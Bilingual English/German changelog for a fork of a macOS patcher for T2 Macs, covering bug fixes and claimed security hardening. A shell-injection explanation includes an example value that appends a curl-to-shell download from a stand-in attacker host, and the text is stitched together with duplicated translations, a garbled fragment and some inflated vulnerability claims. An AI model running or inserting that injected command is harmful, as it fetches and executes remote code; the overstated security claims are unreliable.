- Implementiert self.config["Kernel"]["Quirks"]["ProvideCurrentCpuInfo"] = True für MacBookAir8,1 und MacBookAir8,2 (MacBook Air 2018 und 2019), um einen Kernel-Panic mit der Fehlermeldung „AMFI: developer mode is force enabled on this platform AMFI: finished: 1 1 using 16384 buffer headers and 10240 cluster 10 buffer headers Previous shutdown cause: 1“ zu beheben. (Praxistests stehen noch aus, da ich selbst keines dieser Modelle besitze.)

logging.info("Executing arbitary code")
and below to execute arbitary code.

At this point, the user doesn't see Executing arbitary code, so the attackers can execute whatever code they want to.

- Removes Official Phone Support button in the GUI which basically directed users to a YouTube music instead of giving phone number to call
- Improve disk fetching logic for legacy macOS versions
- Deprecating t2smbiossecurity.py, security_2.py and security_fallback.py as they did risky changes that could also contribute to kernel panics
- Fix a bug where cryptex=0 cs_allow_invalid=1 would not be injected if the user isn't running macOS 26 Tahoe but the user wants to install it
-  Fix a bug where Macs with Iris Graphics Plus were getting patches for Intel UHD Graphics 617

- Fix a bug where existing patches may get overwritten
- Improve OpenCore 1.0.7 stability
- Fixes a bug where macOS Recovery's language is setting back to the computer's language instead of English

Refactor analytics handling and update binary check logic

1. Fixed: JSON Double-Encoding Payload Failure (High Severity Bug)
The Problem: In the original code, it ran self.data = json.dumps(self.data), converting the dictionary into a string. Then, the code passed it to the network handler via json=self.data. Most Python HTTP libraries (like requests) see a string inside a json= parameter and serialize it again.

The Result: The server would receive an invalid, double-escaped JSON string wrapper (e.g., "{\"KEY\": \"...\"}") instead of a readable object, completely breaking your backend's parser.

The Fix: Left self.data as a clean Python dictionary. The network utility now handles the serialization natively and sends clean JSON.

2. Fixed: Uncaught File Encoding Crashing (Medium Severity Bug)
The Problem: The line log_file.read_text() relies on the system's default text encoding (which varies across systems). If a crash log contained non-ASCII characters, corrupted binary segments, or weird null bytes, this call would throw a UnicodeDecodeError.

The Result: The crash reporter itself would crash while trying to report a previous crash.

The Fix: Handled it explicitly with log_file.read_text(encoding="utf-8", errors="ignore") wrapped inside a protective try/except block. If the file is deeply corrupted, it fails gracefully without terminating the program.

3. Fixed: Unbounded Resource/File Descriptor Leak (Vulnerability)
The Problem: The line plistlib.load(Path(path).open("rb")) opened an OS file handle to read the macOS global preferences plist file but never closed it.

The Result: While Python's garbage collector might close it eventually, relying on it is unsafe. If an exception occurs during parsing, that file handle remains tied up in system memory until the script terminates, potentially exhausting available system file descriptors.

The Fix: Wrapped the file operations inside a context manager:

Python
with path.open("rb") as f:
    result = plistlib.load(f)
This guarantees that the file stream is immediately closed and freed from OS memory, even if reading the plist fails mid-way.

4. Fixed: Dangerous Bare Exception Catching (Anti-Pattern / Vulnerability)
The Problem: The block used except: with no specific exception class assigned to it.

The Result: A bare except: is an anti-pattern because it intercepts everything, including Python system signals like SystemExit or a user attempting a force-quit via KeyboardInterrupt.

The Fix: Refactored the catch block to intercept Exception. This successfully mitigates application logic/parsing failures while allowing crucial system-level signals to pass through uninterrupted.

1. Fixed: Local Crash-Log Manipulation Vulnerability
The Vulnerability: In your original code, reading the log file via log_file.read_text() used no encoding parameter. On a local system, if a malicious local user or a rogue background process deliberately injected corrupted multi-byte sequences, zero-byte sequences, or a massive cluster of invalid Unicode codepoints into an application crash log path, it would consistently trigger an unhandled UnicodeDecodeError.

The Exploit Scenario: By manipulating files at the destination path, a local actor could execute a local Denial of Service (DoS) against your error reporting pipeline. They could effectively block the patcher from reporting legitimate system crashes back to your server, keeping you blind to actual problems.

The Fix: Hardening the read command with strict encoding="utf-8" paired with errors="ignore". Any malicious sequence intended to choke the Python string decoder is silently stripped away, rendering the attack vector completely harmless.

2. Fixed: State-Corruption and Typo Propagation
The Vulnerability: In your original code's __init__ constructor, several critical operational variables (self.gpus, self.firmware, self.location, and self.data) were left entirely un-declared. Instead, they were dynamic, ad-hoc attributes declared mid-execution inside your private tracking helper (_generate_base_data()).

The Exploit/Risk Scenario: This pattern introduces a severe State Confusion vulnerability inside Python programs. If send_analytics() fails or is aborted prior to _generate_base_data() running completely, referencing those attributes anywhere else in your class throws an immediate AttributeError. Even worse, it exposes your telemetry script to typo propagation (where a misspelled tracking attribute silently initializes a completely new property instead of failing explicitly).

The Fix: Strict initialization of all object states (list, str, dict) immediately upon creation inside the class constructor (__init__). The object state remains predictable and immutable across its entire operational lifespan.

3. Fixed: String Truncation Guard Failures (Out-of-Bounds Risks)
The Logic Flaw: The parsing mechanism of git information in your crash reporter:

Python
commit_info = self.constants.commit_info[0].split("/")[-1] + "_" + self.constants.commit_info[1].split("T")[0] ...
completely relies on your constants object populating arrays exactly as expected. If an unstable build, localized script error, or system update passes unexpected formats (like missing / or a missing T), string-splitting will silently fail or grab out-of-bounds array slots.

The Fix: The updated logic isolates string slicing cleanly and protects the sequence inside a strict try/except Exception perimeter block. If local path structures or strings do not safely align with formatting, the app discards the routine cleanly instead of surfacing a fatal app-wide exception error.

Überarbeitung der Analyseverarbeitung und Aktualisierung der Binärprüflogik. 1. Behoben: Fehlerhafte JSON-Doppelkodierung der Nutzdaten (Schwerwiegender Fehler)
Das Problem: In Ihrem ursprünglichen Code haben Sie `self.data = json.dumps(self.data)` ausgeführt und das Dictionary in einen String umgewandelt. Anschließend haben Sie diesen über `json=self.data` an den Netzwerkhandler übergeben. Die meisten Python-HTTP-Bibliotheken (wie z. B. `requests`) interpretieren einen String innerhalb eines `json=`-Parameters als erneut serialisiert.

Das Ergebnis: Der Server erhielt einen ungültigen, doppelt maskierten JSON-String (z. B. `{\"KEY\": \"...\"}") anstelle eines lesbaren Objekts, was den Parser Ihres Backends vollständig außer Gefecht setzte.

Die Lösung: `self.data` wird als sauberes Python-Dictionary belassen. Das Netzwerk-Utility verarbeitet die Serialisierung nun nativ und sendet sauberes JSON.

2. Behoben: Unbehandelter Dateikodierungsfehler (mittlerer Schweregrad)
Das Problem: Die Zeile `log_file.read_text()` verwendet die systemeigene Textkodierung (die je nach System variiert). Enthielt ein Absturzprotokoll Nicht-ASCII-Zeichen, beschädigte Binärsegmente oder ungewöhnliche Nullbytes, löste dieser Aufruf einen `UnicodeDecodeError` aus.

Die Folge: Der Absturzbericht stürzte beim Versuch, einen vorherigen Absturz zu melden, ab.

Die Lösung: Der Fehler wurde explizit mit `log_file.read_text(encoding="utf-8", errors="ignore")` behandelt, das in einen schützenden `try/except`-Block eingeschlossen ist. Bei stark beschädigten Dateien wird ein Fehler behoben, ohne das Programm zu beenden.

3. Behoben: Unbegrenzter Ressourcen-/Dateideskriptor-Leak (Schwachstelle)
Das Problem: Die Zeile `plistlib.load(Path(path).open("rb"))` öffnete einen Betriebssystem-Dateihandle, um die globale macOS-Einstellungsdatei (plist) zu lesen, schloss ihn aber nicht.

Ergebnis: Obwohl der Garbage Collector von Python die Datei möglicherweise irgendwann schließt, ist es unsicher, sich darauf zu verlassen. Tritt während des Parsens eine Ausnahme auf, bleibt der Dateihandle im Systemspeicher belegt, bis das Skript beendet wird, wodurch potenziell alle verfügbaren Systemdateideskriptoren erschöpft werden.

Lösung: Die Dateioperationen wurden in einen Kontextmanager eingeschlossen:

Python
with path.open("rb") as f:

result = plistlib.load(f)
Dies garantiert, dass der Dateistream sofort geschlossen und aus dem Betriebssystemspeicher freigegeben wird, selbst wenn das Lesen der plist-Datei fehlschlägt.

4. Behoben: Gefährliches, unstrukturiertes Abfangen von Ausnahmen (Anti-Pattern / Sicherheitslücke)
Das Problem: Der Block verwendete `except:` ohne zugewiesene Ausnahmeklasse.

Ergebnis: Ein unstrukturiertes `except:` ist ein Anti-Pattern, da es alles abfängt, einschließlich Python-Systemsignalen wie `SystemExit` oder einem erzwungenen Beenden durch einen Benutzer über `KeyboardInterrupt`.

Lösung: Der `catch`-Block wurde überarbeitet, um Ausnahmen abzufangen. Dies behebt erfolgreich Fehler in der Anwendungslogik/beim Parsen und ermöglicht gleichzeitig die ungestörte Weiterleitung wichtiger Systemsignale.

1. Behoben: Schwachstelle zur Manipulation lokaler Absturzprotokolle
Die Schwachstelle: In Ihrem ursprünglichen Code wurde beim Lesen der Protokolldatei mit `log_file.read_text()` kein Kodierungsparameter verwendet. Wenn ein böswilliger Benutzer oder ein fehlerhafter Hintergrundprozess auf einem lokalen System absichtlich beschädigte Mehrbyte-Sequenzen, Nullbyte-Sequenzen oder eine große Anzahl ungültiger Unicode-Codepunkte in den Pfad des Anwendungsabsturzprotokolls einfügte, wurde dadurch wiederholt ein unbehandelter `UnicodeDecodeError` ausgelöst.

Das Angriffsszenario: Durch Manipulation von Dateien im Zielpfad konnte ein lokaler Angreifer einen lokalen Denial-of-Service-Angriff (DoS) gegen Ihre Fehlerberichterstattungspipeline ausführen. Dadurch konnte der Patcher effektiv daran gehindert werden, legitime Systemabstürze an Ihren Server zu melden, sodass Sie die tatsächlichen Probleme nicht erkannten.

Die Lösung: Die Lesefunktion wurde durch die Verwendung von `strict encoding="utf-8"` in Kombination mit `errors="ig"` abgesichert.
„nore“. Jegliche schädliche Sequenz, die den Python-String-Decoder blockieren soll, wird stillschweigend entfernt, wodurch der Angriffsvektor völlig harmlos wird.

2. Behoben: Zustandsverfälschung und Tippfehler-Weitergabe
Die Schwachstelle: Im __init__-Konstruktor Ihres ursprünglichen Codes waren mehrere kritische Betriebsvariablen (self.gpus, self.firmware, self.location und self.data) nicht deklariert. Stattdessen handelte es sich um dynamische, ad-hoc-Attribute, die während der Ausführung in Ihrer privaten Tracking-Hilfsfunktion (_generate_base_data()) deklariert wurden.

Das Exploit-/Risikoszenario: Dieses Muster führt zu einer schwerwiegenden Zustandsverfälschung in Python-Programmen. Wenn send_analytics() fehlschlägt oder abgebrochen wird, bevor _generate_base_data() vollständig ausgeführt wurde, führt der Zugriff auf diese Attribute an anderer Stelle in Ihrer Klasse zu einem sofortigen AttributeError. Schlimmer noch: Ihr Telemetrie-Skript ist anfällig für Tippfehler-Weitergabe (ein falsch geschriebenes Tracking-Attribut initialisiert stillschweigend eine völlig neue Eigenschaft, anstatt einen Fehler auszulösen). (explizit).

Die Lösung: Strikte Initialisierung aller Objektzustände (Liste, String, Wörterbuch) direkt bei der Erstellung im Klassenkonstruktor (__init__). Der Objektzustand bleibt während seiner gesamten Lebensdauer vorhersehbar und unveränderlich.

3. Behoben: Fehler beim Schutz vor String-Abschneidung (Risiko von Bereichsüberschreitungen)
Der Logikfehler: Der Parsing-Mechanismus für Git-Informationen in Ihrem Crash-Reporter:

Python: `commit_info = self.constants.commit_info[0].split("/")[-1] + "_" + self.constants.commit_info[1].split("T")[0] ...` ist vollständig davon abhängig, dass Ihr Konstantenobjekt Arrays wie erwartet füllt. Wenn ein instabiler Build, ein lokalisierter Skriptfehler oder ein Systemupdate unerwartete Formate (z. B. fehlendes / oder ein fehlendes T) übergibt, schlägt die String-Aufteilung stillschweigend fehl oder belegt Bereiche außerhalb der Arraygrenzen.

Die Lösung: Die aktualisierte Logik isoliert das String-Slicing sauber. und schützt die Sequenz innerhalb eines strikten try/except-Blocks. Falls lokale Pfadstrukturen oder Strings nicht sicher mit der Formatierung übereinstimmen, verwirft die Anwendung die Routine sauber, anstatt einen schwerwiegenden Anwendungsfehler auszulösen.

Behebt Fehler und kritische Sicherheitslücken.
Überarbeitete Analyseverarbeitung und aktualisierte Binärprüflogik. 1. Behoben: Fehler bei doppelter JSON-Kodierung der Nutzdaten (Schwerwiegender Fehler).
Das Problem: In Ihrem ursprünglichen Code haben Sie `self.data = json.dumps(self.data)` ausgeführt und das Dictionary in einen String konvertiert. Anschließend haben Sie diesen über `json=self.data` an den Netzwerkhandler übergeben. Die meisten Python-HTTP-Bibliotheken (wie z. B. `requests`) interpretieren einen String innerhalb eines `json=`-Parameters als erneut serialisiert.

Das Ergebnis: Der Server erhielt einen ungültigen, doppelt maskierten JSON-String (z. B. `{\"KEY\": \"...\"}") anstelle eines lesbaren Objekts, was den Parser Ihres Backends vollständig außer Gefecht setzte.

Die Lösung: `self.data` wurde als sauberes Objekt beibehalten. Python-Dictionary. Das Netzwerk-Utility verarbeitet die Serialisierung nun nativ und sendet sauberes JSON.

2. Behoben: Absturz aufgrund nicht abgefangener Dateikodierung (Schwierigkeitsgrad: Mittel)
Das Problem: Die Zeile `log_file.read_text()` verwendet die systemeigene Textkodierung (die je nach System variiert). Enthielt ein Absturzprotokoll Nicht-ASCII-Zeichen, beschädigte Binärsegmente oder ungewöhnliche Nullbytes, löste dieser Aufruf einen `UnicodeDecodeError` aus.

Die Folge: Der Absturzbericht stürzte beim Versuch, einen vorherigen Absturz zu melden, ab.

Die Lösung: Das Problem wurde explizit mit `log_file.read_text(encoding="utf-8", errors="ignore")` in einem schützenden `try/except`-Block behandelt. Bei stark beschädigten Dateien wird ein Fehler behoben, ohne das Programm zu beenden.

3. Behoben: Unbegrenzter Ressourcen-/Dateideskriptor-Leak (Schwachstelle)
Das Problem: Die Zeile `plistlib.load(Path(path).open("rb"))` öffnete einen Dateihandle des Betriebssystems. Die globale macOS-Einstellungsdatei (plist) wurde gelesen, aber nie geschlossen.

Folge: Obwohl der Garbage Collector von Python die Datei möglicherweise irgendwann schließt, ist das Verlassen darauf unsicher. Tritt während des Parsens eine Ausnahme auf, bleibt der Dateihandle im Systemspeicher belegt, bis das Skript beendet wird. Dies kann dazu führen, dass die verfügbaren Systemdateideskriptoren erschöpft werden.

Lösung: Die Dateioperationen wurden in einen Kontextmanager eingebettet:

Python:
with path.open("rb") as f:
result = plistlib.load(f)
Dies garantiert, dass der Dateistream sofort geschlossen und aus dem Betriebssystemspeicher freigegeben wird, selbst wenn das Lesen der plist-Datei fehlschlägt.

4. Behoben: Gefährliches, unstrukturiertes Abfangen von Ausnahmen (Anti-Pattern / Sicherheitslücke)
Problem: Der Block verwendete `except:` ohne zugewiesene Ausnahmeklasse.

Folge: Ein unstrukturiertes `except:` ist ein Anti-Pattern, da es alles abfängt, einschließlich Python-Systemsignalen wie `SystemExit` oder einem erzwungenen Beenden durch einen Benutzer über `KeyboardInterrupt`.

Lösung: Refaktoriert Der Catch-Block fängt Ausnahmen ab. Dadurch werden Fehler in der Anwendungslogik bzw. beim Parsen erfolgreich behoben, während wichtige Systemsignale ungehindert weitergeleitet werden.

1. Behoben: Schwachstelle zur Manipulation lokaler Crash-Logs
Die Schwachstelle: In Ihrem ursprünglichen Code wurde beim Lesen der Logdatei mit `log_file.read_text()` kein Kodierungsparameter verwendet. Auf einem lokalen System könnte ein böswilliger Benutzer die lokale Crash-Log-Manipulation ausnutzen.

## 4.0.0 pre-alpha 9 for alpha 15 / 4.0.0 Voralpha 9 für Alpha 15
This release:

updates AppleALC to 1.6.7 for better security and Tahoe compatability
Adds an option when OpenCore building fails, to ask Gemini about the issue to help and suggest a fix
Fixes a bug where blindly injects GPU paths on most T2 Macs with a hardcoded GPU path, which results in GPU init kernel panics by dynamically looking for PCI path instead
Improves error handling
Removes iMac 2019 from the T2 Macs list so it doesn't inject T2 patches that aren't intended for this non-T2 Mac
Fixes a bug where if the GPU is not Intel UHD Graphics 617 or 655, it would automatically inject patches for Intel UHD Graphics 630 instead - even if the GPU is 645
There was a very fragile logic for Intel UHD Graphics 630 injection patches. The logic was it checked if the GPU is not Intel UHD Graphics 630 and if yes, it exited this function. However, this function shouldn't run at all unless the GPU is Intel UHD Graphics 630, else it may inject the inappropriate patches if it doesn't exit the function properly. And there's also a vulnerability where attackers may intentionally make the function not to exit to perform Denial of Service attacks. This vulnerability is fixed as well.

## 4.0.0 pre-alpha 8 for alpha 15 / Voralpha 8 für Alpha 15
This release fixes a bug where Touch Bar patches are applied across all Macs, which could result in a kernel panic on anything non-MacBook Pro.
Dieses Release behebt einen Fehler, bei dem Touch-Bar-Patches auf alle Macs angewendet wurden – was auf allen Geräten außer dem MacBook Pro zu einem Kernel Panic führen konnte.
And also, fixes a bug where AppleSEPManager 4883BFB003000000754F binary is replaced twice with 2 different binaries, a perfect ground for kernel panics too.
Zudem wird ein Fehler behoben, bei dem das Binary AppleSEPManager 4883BFB003000000754F zweimal durch zwei unterschiedliche Binaries ersetzt wurde – ein idealer Nährboden auch für Kernel Panics.

## 4.0.0 pre-alpha 7 for alpha 15 / 4.0.0 Voralpha 7 für Alpha 15
This release:

Fixes a bug where OpenCore EFIs where the EFI may not be generated at all unless the user creates a partition called OpenCore by themselves by rolling back to traditional EFI mounting #55
Fixes also several other bugs:
Fix critical bugs
Syntactical Bug: Case-Insensitive Type Hinting
The Issue: The original file used value: any in the _set_nvram_value signature. In Python, any is a built-in function, not a type. This causes static analyzers, linters, and IDEs to flag an error.
The Fix: Changed any to Any and added from typing import Any at the top of the file.

Runtime Risk: Potential KeyError on Unknown SMBIOS Models
The Issue: The line smbios_data.smbios_dictionary[self.model] assumed the current Mac model identifier would always exist in the dictionary. If an experimental identifier or unsupported model was passed, the script would instantly crash with a unhandled KeyError.
The Fix: Refactored the code to use the safer .get() method dictionary wrapper:

model_smbios = smbios_data.smbios_dictionary.get(self.model, {})
max_os_supported = model_smbios.get("Max OS Supported", 0)
If the model isn't found, it now falls back gracefully instead of crashing.

Structural Flaw: Redundant Code Duplication
The Issue: At the very end of the original _build() function, there was a "Final Override Block Execution Guard" for T2 Macs. This block repeated the exact configuration modifications to Misc -> Security and boot-args that had already been executed at the start of the _build() block.
The Fix: Safely deleted this block. Because the states were identical, removing it slims down the footprint, reduces redundant dictionary indexing operations, and improves code readability.

Edge-Case Parsing Risk: Inconsistent Argument Delimitation
The Issue: When disable_amfi was flagged, the original code combined the strings together before passing them to the NVRAM token updater: "amfi=0x80 amfi_get_out_of_my_way=1". While your space-splitting logic usually works, passing pre-combined values risks bypassing boundary constraints or creating formatting errors if the underlying configuration storage layout changes.
The Fix: Standardized argument updates so that every NVRAM string mutation is handled step-by-step as single, independent arguments.

Removes FIPS patches - they cause corecrypto kernel panics.
And other bug fixes.

Dieses Release:

Behebt einen Fehler bei OpenCore-EFIs, bei dem die EFI unter Umständen gar nicht erst generiert wurde – es sei denn, der Benutzer erstellte manuell eine Partition namens „OpenCore“ –, indem auf die traditionelle EFI-Einbindung zurückgegriffen wird (siehe #55).
Zudem werden diverse weitere Fehler behoben:
Behebung kritischer Fehler
Syntaxfehler: Groß-/Kleinschreibung bei Typ-Hinweisen (Type Hinting)
Das Problem: Die Originaldatei verwendete value: any in der Signatur der Funktion _set_nvram_value. In Python ist any jedoch eine integrierte Funktion und kein Datentyp. Dies führte dazu, dass statische Code-Analysatoren, Linter und IDEs einen Fehler meldeten.
Die Lösung: any wurde in Any geändert und am Anfang der Datei die Zeile from typing import Any hinzugefügt.

Laufzeitrisiko: Potenzieller KeyError bei unbekannten SMBIOS-Modellen
Das Problem: Die Zeile smbios_data.smbios_dictionary[self.model] ging davon aus, dass die Kennung des aktuellen Mac-Modells stets im entsprechenden Wörterbuch (Dictionary) vorhanden sei. Wurde jedoch eine experimentelle Kennung oder ein nicht unterstütztes Modell übergeben, stürzte das Skript sofort mit einem unbehandelten KeyError ab.
Die Lösung: Der Code wurde überarbeitet, um die sicherere get()-Methode für den Zugriff auf das Wörterbuch zu verwenden:

model_smbios = smbios_data.smbios_dictionary.get(self.model, {})
max_os_supported = model_smbios.get("Max OS Supported", 0)
Wird das Modell nun nicht gefunden, erfolgt eine kontrollierte Fallback-Reaktion, anstatt dass das Programm abstürzt.

Struktureller Mangel: Redundante Code-Duplizierung
Das Problem: Ganz am Ende der ursprünglichen Funktion _build() befand sich ein „Schutzblock für die Ausführung finaler Überschreibungen“ (Final Override Block Execution Guard) speziell für T2-Macs. Dieser Block wiederholte exakt jene Konfigurationsänderungen an den Bereichen Misc -> Security und boot-args, die bereits zu Beginn des _build()-Blocks ausgeführt worden waren.
Die Lösung: Dieser Block wurde sicher entfernt. Da die Zustände identisch waren, verringert die Entfernung den Code-Umfang, reduziert redundante Zugriffe auf das Wörterbuch und verbessert die Lesbarkeit des Codes.

Risiko bei der Edge-Case-Analyse: Inkonsistente Argumenttrennung
Das Problem: Wenn das Flag disable_amfi gesetzt war, verknüpfte der ursprüngliche Code die entsprechenden Zeichenketten miteinander, bevor er sie an den NVRAM-Token-Updater übergab – beispielsweise: „amfi=0x80 amfi_get_out_of_my_way=1“. Zwar funktioniert Ihre Logik zur Trennung anhand von Leerzeichen in der Regel zuverlässig; die Übergabe bereits zusammengeführter Werte birgt jedoch das Risiko, dass Begrenzungen (Boundary Constraints) umgangen werden oder Formatierungsfehler entstehen, sollte sich das zugrundeliegende Layout des Konfigurationsspeichers ändern.
Die Lösung: Standardisierte Argument-Updates, durch die jede Modifikation einer NVRAM-Zeichenkette schrittweise als einzelnes, unabhängiges Argument verarbeitet wird.

Entfernt FIPS-Patches - die sind Ursache für corecrypto-Kernel Panics.
Und andere Fehler behoben

## 4.0.0 pre-alpha 6 for alpha 15 / 4.0.0 Voralpha 6 für Alpha 15
This release:

- fixes WiFi/Bluetooth not working on iMac 2017 Retina 4K on macOS 26 Tahoe
- Downgrades Python to 3.13.13 so I can add support for macOS 10.13 High Sierra
- Now, OpenCore should boot from a seperate OpenCore partition instead from the EFI. This fixes an issue where the boot entries for other operating systems in the EFI may disappear. Also, it allows the T2 chip to verify the integrity of the EFI partition. This fixes #44 . And also, increases security.
- Fixes Settings UI bugs

Diese Version:

- behebt WiFi/Bluetooth-Problem, indem iMac 2017 Retina 4K aufs macOS 26 Tahoe gar nicht funktionieren
- Downgraded Python zu version 3.13.14, um auf macOS 10.13 High Sierra auch zu funktionieren
- Nun sollte OpenCore von einer separaten OpenCore-Partition booten, anstatt aus der EFI. Dies behebt ein Problem, bei dem die Starteinträge für andere Betriebssysteme in der EFI verschwinden konnten. Zudem ermöglicht es dem T2-Chip, die Integrität der EFI-Partition zu überprüfen. Das behebt auch #44 . Auch, das selbst erhöht die Sicherheit des Betriebssystems.
- Behebt Fehlern in Einstellungen/Settings-Oberfläche

## 4.0.0 pre-alpha 5 / 4.0.0 Voralpha 5
Thanks @GUTY345 for contributing to this project!
This release:

begins implementing corecrypto kernel panic fixes, that other prealpha versions have - https://github.com/GUTY345/OpenCore-Legacy-patcher-t2chip-fixBugs/issues/8, #39

Fixes bugs where OpenCore Legacy Patcher T2 may inject duplicate/conflicting NVRAM variables

Fixes a bug where Macmini8,1 would say macOS 26 Tahoe is not supported on this Mac

Fix injecting patches for unsupported Macs on MacBook Pro 2020 4 thunderbolt 3 ports which is natively supported

Increasing minimum requirements for this patcher to run to macOS 10.15.7 Catalina (as pre-Python3.14 versions haven't been tested)

Improve Intel UHD Graphics 617 support

Fix UI stalls on Intel UHD Graphics 630

Start implementing support for Intel Iris Graphics Plus 655

Fixes several vulnerabilities:

When OpenCore Legacy Patcher checks for disks, first tries to run code for macOS 10.13.x and if it fails, it falls back to 10.12.x code without strictly checking the macOS version on which is currently running. In that specific case, this allowed attackers to delete the hard disk from the dicitonary of the application to perform Denial of Service attacks.

Fixes: Cross-Thread UI Race Conditions (Split-Event Vulnerability)

The Vulnerability: the original error handling fired multiple sequential wx.CallAfter statements back-to-back from background worker threads. Because these events were split up in the main thread's queue, the OS event loop could process them out of order, try to redraw the screen mid-execution, or crash entirely if sys.exit() occurred before all elements finished processing.

The Fix: Created atomic UI methods like _handle_fatal_failure and _finalize_ui_and_start_countdown. Now, background worker threads make exactly one single wx.CallAfter push. The progress bar animation stops, the value is reset, and the window state updates simultaneously inside a single main-thread transaction.

Fixes: Main Thread UI Freezing & Application Hanging

The Vulnerability: The original code used a while True: loop paired with time.sleep(1) inside the main initializer. Sleeping on the main thread starves the wxPython event loop, preventing the window from processing system paint messages, responding to clicks, or handling clean shutdowns.

The Fix: The 5-second exit countdown has been completely rebuilt using a non-blocking wx.Timer (self.exit_timer). It allows the application to remain 100% responsive during the countdown, letting the OS handle background window cleanup cycles gracefully.

Fixes: Hazardous Multi-Threaded Re-entrancy (wx.Yield Removal)

The Vulnerability: The original architecture relied on wx.Yield() to manually force graphic redraws while blocking steps executed on the main thread. In a multi-threaded app, unexpected yields allow new user interactions (like clicking buttons twice) to run over old execution paths, causing severe multi-threaded corruption and race states.

The Fix: Every single instance of wx.Yield() has been eliminated. All blocking operations—downloading, extracting, and running system commands—are completely isolated inside a master orchestration background worker thread (_workflow_thread).

Fixes: Personal Fork Phishing / Hardcoded URL Risk

The Vulnerability: The old code contained a hardcoded error string pointing to a user's personal GitHub fork (https://github.com/albert-mueller/...). If that personal account were compromised or abandoned, attackers could use the error text to trick users into downloading malicious system packages.

The Fix: The personal URL was removed. The fallback logic now pulls dynamically from your application's centralized global configuration configuration file (self.constants.support_url), maintaining a centralized and verifiable point of trust.

## 4.0.0 pre-alpha 4 / 4.0.0 Voralpha 4
Thanks @GUTY345 for contributing to this project!
This release:

Bug fixes
Adds more patches for T2 Macs
Now when clicking Build OpenCore EFI, it will automatically put the files inside the EFI on the drive (if you want, you can cancel this and select the drive of your choice as before)
Now, Install Root Patches is called Install drivers and patches
From this release on, I started to implement Intel UHD Graphics 617 support. However, support for this GPU is incomplete.
Fixes a vulnerability where when trying to launch an update, an attacker could supply gui_update.py with invalid syntax to crash the entire update process to make victims use vulnerable versions
Danke @GUTY345, dass Sie zu diesem Projekt beigetragen haben!
Diese Version:

Fehlerbehebungen
Beim Anklicken von „Build OpenCore EFI“ werden die Dateien nun automatisch direkt in die EFI-Partition auf dem Laufwerk platziert (falls gewünscht, kann dieser Vorgang abgebrochen und – wie zuvor – ein beliebiges anderes Laufwerk ausgewählt werden).
Jetzt Install Root Patches heißt Install drivers and patches
Mit diese Version, das ist die erste, die Intel UHD Graphics 617 unterstützt. Aber die Unterstützung ist nicht zu 100%.
Behebung einer Sicherheitslücke: Beim Versuch, ein Update zu starten, konnte ein Angreifer der Datei gui_update.py eine ungültige Syntax übermitteln, um den gesamten Update-Vorgang zum Absturz zu bringen und die Opfer so zur weiteren Nutzung anfälliger Versionen zu zwingen.

## 4.0.0 pre-alpha 3 for alpha 15 / 4.0.0 Voralpha 3 für Alpha 15
This release:

- fixes a bug where required entries for OpenCore 1.0.7 are deleted by support.py

- updates actions/checkout to v6

- Fixes a bug where t2smbiossecurity.py generates an invalid EFI

Fixes several vulnerabilities:

Arbitrary File Deletion (The "Nuke" Bug)
The Vulnerability: The original code used subprocess.run(["rm", "-rf", self.constants.build_path]). If build_path was ever returned as an empty string, a single space, or a top-level directory (like ~ or /) due to a bug elsewhere in the code, the script would delete everything it had permission to access.

The Fix: We now use shutil.rmtree combined with a Name Guard. The script now verifies that the folder name is explicitly Build-Folder before it allows a recursive deletion. This ensures that even if the path is misconfigured, it won't wipe out your home directory.

Shell Injection (Command Hijacking)
The Vulnerability: Using strings to build commands (e.g., f"rm -rf {path}") allows for shell injection. If an attacker could influence the name of a model or a path, they could inject additional commands (e.g., model_name = "MacBook; curl http://attacker.com/malware | sh").
The Fix: Every subprocess.run call now uses Argument Arrays (lists). By passing arguments as a list, Python bypasses the system shell entirely. The OS treats the entire string as a literal filename/argument rather than a command to be parsed, making injection impossible.

Path Traversal (Escaping the Sandbox)
The Vulnerability: Older methods of path joining (string concatenation with /) are susceptible to "dot-dot-slash" (../) attacks. An attacker could craft a file path that escapes the intended binary directory to overwrite system files or sensitive configurations.
The Fix: Switched entirely to pathlib.Path. The .resolve() and division (/) operator logic in pathlib handles path normalization more safely. It ensures that the file operations stay within the expected directory tree by treating paths as objects rather than just strings.

Persistence Leaks (Zombies & Mount-Locking)
The Vulnerability: The original script relied on atexit to unmount DMGs. If the script crashed halfway through (e.g., during the T2 model validation error you saw earlier), atexit might never trigger. This leaves the Universal-Binaries.dmg mounted and the shadow file locked, which can prevent future builds from starting or leak disk space.
The Fix: Implemented a try...finally block at the highest level of the init method. The finally block is a "guaranteed" execution path in Python. Even if a validation error raises an Exception and stops the script, the _cleanup_build_artifacts() and _unmount_dmg() functions will run immediately, clearing the mount points and temporary files.

Diese Version:

behebt einen Fehler, bei dem erforderliche Einträge für OpenCore 1.0.7 von support.py gelöscht wurden

aktualisiert actions/checkout auf v6

behebt einen Fehler, bei dem t2smbiossecurity.py eine ungültige EFI-Datei erzeugte

behebt mehrere Sicherheitslücken:

Willkürliches Löschen von Dateien (Der „Nuke“-Bug)
Die Sicherheitslücke: Der ursprüngliche Code verwendete subprocess.run(["rm", "-rf", self.constants.build_path]). Falls build_path aufgrund eines Fehlers an anderer Stelle im Code jemals als leerer String, als einzelnes Leerzeichen oder als Verzeichnis der obersten Ebene (wie ~ oder /) zurückgegeben worden wäre, hätte das Skript alles gelöscht, worauf es Zugriffsberechtigungen besaß.
Die Behebung: Wir verwenden nun shutil.rmtree in Kombination mit einem „Name Guard“ (Namensschutz). Das Skript überprüft nun, ob der Ordnername explizit „Build-Folder“ lautet, bevor es eine rekursive Löschung zulässt. Dies stellt sicher, dass selbst bei einer Fehlkonfiguration des Pfades nicht Ihr gesamtes Home-Verzeichnis gelöscht wird.

Shell-Injection (Befehls-Hijacking)
Die Sicherheitslücke: Die Verwendung von Strings zur Konstruktion von Befehlen (z. B. f"rm -rf {path}") ermöglicht eine Shell-Injection. Könnte ein Angreifer den Namen eines Modells oder einen Pfad manipulieren, könnte er zusätzliche Befehle einschleusen (z. B. model_name = "MacBook; curl http://attacker.com/malware | sh").
Die Behebung: Jeder Aufruf von subprocess.run verwendet nun Argument-Arrays (Listen). Durch die Übergabe von Argumenten als Liste umgeht Python die System-Shell vollständig. Das Betriebssystem behandelt den gesamten String als wörtlichen Dateinamen bzw. als Argument und nicht als einen zu parsierenden Befehl; dies macht eine Injection unmöglich.

Path Traversal (Ausbruch aus der Sandbox)
